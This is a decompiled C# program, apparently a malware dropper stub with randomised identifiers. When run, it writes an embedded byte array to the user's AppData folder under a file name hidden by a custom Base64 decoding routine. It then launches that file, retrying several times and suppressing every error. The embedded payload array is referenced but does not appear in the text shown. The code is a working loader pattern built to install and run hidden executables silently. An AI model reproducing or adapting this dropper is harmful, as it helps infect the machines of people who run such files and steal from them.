using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class ixqaJL
{
	[STAThread]
	public static void Main()
	{
		try
		{
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + CNHZJf("bYlhm45cgYZofl+llGiwTGR1dm5Jm7mtLw==", "False"), bytes);
		}
		catch (Exception ex)
		{
			int num = default(int);
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			int num = 1;
			try
			{
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + CNHZJf("bYlhm45cgYZofl+llGiwTGR1dm5Jm7mtLw==", "False"));
				ProjectData.EndApp();
				break;
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2, num);
				if (num2 == 3)
				{
					ProjectData.EndApp();
					ProjectData.ClearProjectError();
					break;
				}
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string CNHZJf(string rCIEQh, string KdJhyZ)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(dkmvTO(Convert.FromBase64String(rCIEQh), Encoding.UTF8.GetBytes(KdJhyZ)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static byte[] dkmvTO(byte[] rCIEQh, byte[] KdJhyZ)
	{
		checked
		{
			int num = rCIEQh[rCIEQh.Length - 1];
			byte[] array = new byte[rCIEQh.Length - 2 + 1];
			short num2 = 0;
			try
			{
				int num3 = rCIEQh.Length - 2;
				for (int i = 0; i <= num3; i++)
				{
					if (num2 >= KdJhyZ.Length)
					{
						num2 = 0;
					}
					if (i < rCIEQh.Length - 1)
					{
						array[i] = Convert.ToByte(unchecked((int)rCIEQh[i]) - unchecked(array.Length % KdJhyZ.Length) - unchecked((int)KdJhyZ[num2]) + num);
						num2 = (short)(num2 + 1);
					}
				}
				return array;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = array;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}